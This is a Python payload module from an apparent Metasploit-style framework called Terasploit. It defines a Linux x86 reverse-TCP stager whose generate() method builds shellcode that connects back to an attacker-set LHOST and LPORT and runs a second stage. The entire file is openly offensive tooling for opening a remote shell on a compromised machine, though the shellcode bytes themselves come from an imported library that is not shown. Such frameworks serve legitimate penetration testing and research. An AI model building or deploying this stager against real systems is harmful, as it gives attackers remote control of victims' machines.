"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            modules/payload/stagers/linux/x86/shell/reverse_tcp.py
"""

from teralibs.tsf.base.payload import ARCH_X86, PLATFORM_LINUX, STAGER, Payload, PayloadHandler
from teralibs.tsf.core.payload.linux.x86.reverse_tcp import ReverseTcpX86


class TerasploitModule(ReverseTcpX86, Payload):
    """Linux x86 reverse-TCP stager."""

    NAME = "Linux x86 Reverse TCP Stager"
    DESCRIPTION = (
        "Linux IA-32 stager that opens a reverse TCP channel to the attacker "
        "and executes the companion stage delivered by the framework."
    )
    AUTHOR = "4steroth"
    LICENSE = "BSD-3-CLAUSE"
    VERSION = "1.1"
    RANK = "normal"
    REFERENCES = [
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "modules/payloads/stagers/linux/x86/reverse_tcp.rb",
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "lib/msf/core/payload/linux/reverse_tcp_x86.rb",
    ]

    PAYLOAD_TYPE = STAGER
    HANDLER = PayloadHandler.ReverseTCP

    STAGE_PATH = "linux.x86.shell"

    CACHED_SIZE = 123
    MAX_SIZE = 300

    ARCH = [ARCH_X86]
    PLATFORM = [PLATFORM_LINUX]

    OPTIONS = ["LHOST", "LPORT", "EXITFUNC"]

    def generate(self, ctx):
        """
        Generate the Linux x86 reverse-TCP stager shellcode.

        Reads all retry / EXITFUNC options from the payload_advanced scope
        so they are consistent with every other stager in the framework.
        """
        host = ctx.get_option("LHOST")
        port = int(ctx.get_option("LPORT"))
        retry_count = int(ctx.get_option("StagerRetryCount") or 10)
        sleep_seconds = float(ctx.get_option("StagerRetryWait") or 5.0)
        exitfunc = str(ctx.get_option("EXITFUNC") or "process").lower().strip()

        shellcode = self.generate_reverse_tcp(
            host=(
                host,
                port,
            ),
            retry_count=retry_count,
            sleep_seconds=sleep_seconds,
            exitfunc=exitfunc,
        )

        return shellcode
